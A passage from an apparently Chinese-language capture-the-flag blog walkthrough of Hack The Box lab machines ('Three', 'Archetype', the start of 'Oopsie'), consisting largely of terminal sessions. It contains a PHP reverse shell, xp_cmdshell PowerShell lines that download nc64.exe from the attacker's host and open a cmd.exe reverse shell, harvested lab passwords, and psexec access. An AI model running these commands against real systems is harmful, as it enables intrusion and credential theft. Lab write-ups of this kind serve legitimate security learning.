php-reverse-shell.php<br>2023-06-01 23:19:09         31 shell.php<br>2023-06-01 23:27:06         80 shellre.php<br></code></pre></td></tr></table></figure><p>通过 curl 去访问，反弹 shell 成功，后面就进行简单的信息收集，在 www 目录下发现了flag.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>listening on [any] 1234 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.227.248] 38080<br>Linux three 4.15.0-189-generic <span class="hljs-comment">#200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br> 03:32:52 up  1:33,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@three:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">www-data@three:/$ ip a</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:50:56:b9:ac:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 10.129.227.248/16 brd 10.129.255.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 dead:beef::250:56ff:feb9:ac02/64 scope global dynamic mngtmpaddr</span><br><span class="hljs-string">       valid_lft 86391sec preferred_lft 14391sec</span><br><span class="hljs-string">    inet6 fe80::250:56ff:feb9:ac02/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="hljs-string">    link/ether 02:42:2d:2f:a4:be brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">4: br-2de548fc06bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="hljs-string">    link/ether 02:42:f6:13:a4:fd brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2de548fc06bf</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::42:f6ff:fe13:a4fd/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">6: veth1c9ddaf@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2de548fc06bf state UP group default</span><br><span class="hljs-string">    link/ether 8e:19:6f:3f:9d:5f brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="hljs-string">    inet6 fe80::8c19:6fff:fe3f:9d5f/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">www-data@three:/$ pwd</span><br><span class="hljs-string">pwd</span><br><span class="hljs-string">/</span><br><span class="hljs-string">www-data@three:/$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">bin   etc         initrd.img.old  lost+found  opt   run   sys  var</span><br><span class="hljs-string">boot  home        lib             media       proc  sbin  tmp  vmlinuz</span><br><span class="hljs-string">dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old</span><br><span class="hljs-string">www-data@three:/$ cd /root</span><br><span class="hljs-string">cd /root</span><br><span class="hljs-string">bash: cd: /root: Permission denied</span><br><span class="hljs-string">www-data@three:/$ cat /etc/crontab</span><br><span class="hljs-string">cat /etc/crontab</span><br><span class="hljs-string"># /etc/crontab: system-wide crontab</span><br><span class="hljs-string"># Unlike any other crontab you don&#x27;</span>t have to run the `crontab<span class="hljs-string">&#x27;</span><br><span class="hljs-string"># command to install the new version when you edit this file</span><br><span class="hljs-string"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-string"># that none of the other crontabs do.</span><br><span class="hljs-string"></span><br><span class="hljs-string">SHELL=/bin/sh</span><br><span class="hljs-string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string"># m h dom mon dow user  command</span><br><span class="hljs-string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="hljs-string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="hljs-string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="hljs-string">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="hljs-string">#</span><br><span class="hljs-string">www-data@three:/$ cd /var/www</span><br><span class="hljs-string">cd /var/www</span><br><span class="hljs-string">www-data@three:/var/www$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">flag.txt  html</span><br><span class="hljs-string">www-data@three:/var/www$ cat flag.txt</span><br><span class="hljs-string">cat flag.txt</span><br><span class="hljs-string">a980d99281a28d638ac68b9bf9453c2b</span><br></code></pre></td></tr></table></figure><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.142.66<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 04:06 EDT<br>Warning: 10.129.142.66 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.142.66<br>Host is up (0.031s latency).<br>Not shown: 65135 closed tcp ports (reset), 388 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>1433/tcp  open  ms-sql-s<br>5985/tcp  open  wsman<br>47001/tcp open  winrm<br>49664/tcp open  unknown<br>49665/tcp open  unknown<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49668/tcp open  unknown<br>49669/tcp open  unknown<br><br></code></pre></td></tr></table></figure><h3 id="smb-信息收集"><a href="#smb-信息收集" class="headerlink" title="smb 信息收集"></a>smb 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 10.129.142.66<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 04:09 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.142.66<br>Host is up (0.0094s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>1433/tcp open  ms-sql-s<br><br>Host script results:<br>| smb-enum-shares:<br>|   account_used: guest<br>|   \\10.129.142.66\ADMIN$:<br>|     Type: STYPE_DISKTREE_HIDDEN<br>|     Comment: Remote Admin<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.129.142.66\C$:<br>|     Type: STYPE_DISKTREE_HIDDEN<br>|     Comment: Default share<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.129.142.66\IPC$:<br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: Remote IPC<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.129.142.66\backups:<br>|     Type: STYPE_DISKTREE<br>|     Comment:<br>|     Anonymous access: READ<br>|_    Current user access: READ<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.35 seconds<br></code></pre></td></tr></table></figure><h3 id="smb-登录"><a href="#smb-登录" class="headerlink" title="smb 登录"></a>smb 登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ smbclient //10.129.142.66/backups<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\i3eg1nner]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Jan 20 07:20:57 2020<br>  ..                                  D        0  Mon Jan 20 07:20:57 2020<br>  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020<br><br>                5056511 blocks of size 4096. 2609591 blocks available<br>smb: \&gt; <span class="hljs-built_in">help</span><br>?              allinfo        altname        archive        backup<br>blocksize      cancel         case_sensitive <span class="hljs-built_in">cd</span>             <span class="hljs-built_in">chmod</span><br><span class="hljs-built_in">chown</span>          close          del            deltree        <span class="hljs-built_in">dir</span><br><span class="hljs-built_in">du</span>             <span class="hljs-built_in">echo</span>           <span class="hljs-built_in">exit</span>           get            getfacl<br>geteas         hardlink       <span class="hljs-built_in">help</span>           <span class="hljs-built_in">history</span>        iosize<br>lcd            <span class="hljs-built_in">link</span>           lock           lowercase      <span class="hljs-built_in">ls</span><br>l              mask           md             mget           <span class="hljs-built_in">mkdir</span><br>more           mput           newer          notify         open<br>posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir<br>posix_unlink   posix_whoami   <span class="hljs-built_in">print</span>          prompt         put<br><span class="hljs-built_in">pwd</span>            q              queue          quit           <span class="hljs-built_in">readlink</span><br>rd             recurse        reget          rename         reput<br><span class="hljs-built_in">rm</span>             <span class="hljs-built_in">rmdir</span>          showacls       setea          setmode<br>scopy          <span class="hljs-built_in">stat</span>           symlink        tar            tarmode<br><span class="hljs-built_in">timeout</span>        translate      unlock         volume         vuid<br>wdel           logon          listconnect    showconnect    tcon<br>tdis           tid            utimes         logoff         ..<br>!<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size 609 as prod.dtsConfig (35.0 KiloBytes/sec) (average 35.0 KiloBytes/sec)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cat</span> prod.dtsConfig<br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID=<span class="hljs-string">&quot;...&quot;</span> GeneratedDate=<span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=<span class="hljs-string">&quot;Property&quot;</span> Path=<span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType=<span class="hljs-string">&quot;String&quot;</span>&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><h3 id="mssql-渗透"><a href="#mssql-渗透" class="headerlink" title="mssql 渗透"></a>mssql 渗透</h3><p>发现了用户名和密码，并且用户名中有 sql 关键字，而端口扫描的结果显示，靶机开启了 mssql。因此尝试登录，使用的工具是<code>impacket-mssqlclient</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ impacket-mssqlclient -windows-auth sql_svc@10.129.142.66<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>SQL&gt; <span class="hljs-built_in">help</span><br><br>     lcd &#123;path&#125;                 - changes the current <span class="hljs-built_in">local</span> directory to &#123;path&#125;<br>     <span class="hljs-built_in">exit</span>                       - terminates the server process (and this session)<br>     enable_xp_cmdshell         - you know what it means<br>     disable_xp_cmdshell        - you know what it means<br>     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell<br>     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)<br>     ! &#123;cmd&#125;                    - executes a <span class="hljs-built_in">local</span> shell cmd<br></code></pre></td></tr></table></figure><p>使用以下命令进行判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br></code></pre></td></tr></table></figure><p>发现确实有权限，那接下来要获取命令执行的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">EXEC xp_cmdshell <span class="hljs-string">&#x27;net user&#x27;</span>; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default: <br>EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1; — priv <br>RECONFIGURE; — priv <br>EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 1; — priv <br>RECONFIGURE; — priv<br></code></pre></td></tr></table></figure><p>也可以使用工具中自带的功能，它会给出一定的指引</p><p><img src="/pic/3ead4281f5a07e1e757b00331112c7e5_MD5.png"></p><p>接下来我们就可以使用 xp_cmdshell 来执行命令了，我们开始考虑如何反弹 shell，首先在机器上上传 nc.exe 文件，然后利用 nc 反弹 shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe&quot;</span><br>SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[/usr/share/windows-resources/binaries]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.142.66] 49677<br>Microsoft Windows [Version 10.0.17763.2061]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Downloads<br><br>06/02/2023  01:48 AM    &lt;DIR&gt;          .<br>06/02/2023  01:48 AM    &lt;DIR&gt;          ..<br>06/02/2023  01:45 AM            59,392 nc.exe<br>06/02/2023  01:48 AM            59,392 nc64.exe<br>               2 File(s)        118,784 bytes<br>               2 Dir(s)  10,717,417,472 bytes free<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\sql_svc\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Desktop<br><br>01/20/2020  06:42 AM    &lt;DIR&gt;          .<br>01/20/2020  06:42 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:37 AM                32 user.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  10,717,413,376 bytes free<br><br>C:\Users\sql_svc\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><br></code></pre></td></tr></table></figure><p>查看 powshell 历史的文件，找到了用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>    C:\Users\Default\NTUSER.DAT<br>    C:\Users\sql_svc\NTUSER.DAT<br><br>▒▒▒▒▒▒▒▒▒▒͹ Analyzing Other Windows Files Files (<span class="hljs-built_in">limit</span> 70)<br><br>       /---------------------------------------------------------------------------\<br>       |                             Do you like PEASS?                            |<br>       |---------------------------------------------------------------------------|<br>       |         Become a Patreon    :     https://www.patreon.com/peass           |<br>       |         Follow on Twitter   :     @carlospolopm                           |<br>       |         Respect on HTB      :     SirBroccoli &amp; makikvues                 |<br>       |---------------------------------------------------------------------------|<br>       |                                 Thank you!                                |<br>       \---------------------------------------------------------------------------/<br><br>PS C:\Users\sql_svc\Downloads&gt; <span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!<br><br></code></pre></td></tr></table></figure><p>最后使用 impacket-psexec 来连接 administrator</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/windows]<br>└─$ impacket-psexec administrator@10.129.142.66<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.129.142.66.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file baWlxTKg.exe<br>[*] Opening SVCManager on 10.129.142.66.....<br>[*] Creating service Waku on 10.129.142.66.....<br>[*] Starting service Waku.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands                                                                                                                                                                                                Microsoft Windows [Version 10.0.17763.2061]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Users\Administrator\Desktop&quot;</span><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span>                                                                                                                                                                                                     Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\Administrator\Desktop<br><br>07/27/2021  02:30 AM    &lt;DIR&gt;          .<br>07/27/2021  02:30 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:36 AM                32 root.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  10,688,098,304 bytes free<br><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txt <br></code></pre></td></tr></table></figure><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.95.191<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:23 EDT<br>Warning: 10.129.95.191 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.95.191<br>Host is up (0.057s latency).<br>Not shown: 65011 closed tcp ports (reset), 522 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.72 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.129.95.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 